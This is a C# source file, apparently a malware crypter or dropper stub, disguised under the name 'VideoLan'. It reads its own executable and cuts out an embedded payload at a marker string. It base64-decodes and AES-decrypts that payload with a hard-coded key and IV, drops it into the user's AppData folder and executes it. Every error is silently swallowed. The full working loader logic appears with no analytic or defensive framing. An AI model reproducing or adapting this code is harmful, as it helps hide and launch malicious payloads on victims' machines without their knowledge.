using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;

namespace VideoLan;

internal class VideoLan
{
	private static byte[] FileContinent;

	private static string[] MCSplit = new string[1] { "[zZPM6EuHbZkji3gNSkS3IW6KO]" };

	private static string[] FileInfo;

	private static string FileText;

	private static string AppFolder;

	private static void Main(string[] args)
	{
		try
		{
			FileText = ReadFile();
			AppFolder = FindFolder();
			FileInfo = MCEn();
			FileContinent = MCTje(Convert.FromBase64String(FileInfo[1]));
			Writing();
			StartDia();
		}
		catch
		{
		}
	}

	private static string Writing()
	{
		try
		{
			File.WriteAllBytes(AppFolder + "\\" + FileInfo[2], FileContinent);
			return "yes";
		}
		catch
		{
			return "no";
		}
	}

	private static string FindFolder()
	{
		try
		{
			return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		}
		catch
		{
			return "";
		}
	}

	private static byte[] MCTje(byte[] RijnKey)
	{
		try
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			byte[] iV = new byte[16]
			{
				1, 2, 3, 4, 5, 6, 7, 8, 9, 1,
				2, 3, 4, 5, 6, 7
			};
			byte[] key = new byte[16]
			{
				7, 6, 5, 4, 3, 2, 1, 9, 8, 7,
				6, 5, 4, 3, 2, 1
			};
			rijndaelManaged.IV = iV;
			rijndaelManaged.Key = key;
			return rijndaelManaged.CreateDecryptor().TransformFinalBlock(RijnKey, 0, RijnKey.Length);
		}
		catch
		{
			return null;
		}
	}

	private static string StartDia()
	{
		try
		{
			Process.Start(AppFolder + "\\" + FileInfo[2]);
			return "yes";
		}
		catch
		{
			return "no";
		}
	}

	private static string[] MCEn()
	{
		try
		{
			return FileText.Split(MCSplit, StringSplitOptions.None);
		}
		catch
		{
			return new string[2] { "z", "e" };
		}
	}

	private static string ReadFile()
	{
		try
		{
			return File.ReadAllText(Process.GetCurrentProcess().MainModule!.FileName);
		}
		catch
		{
			return "";
		}
	}
}
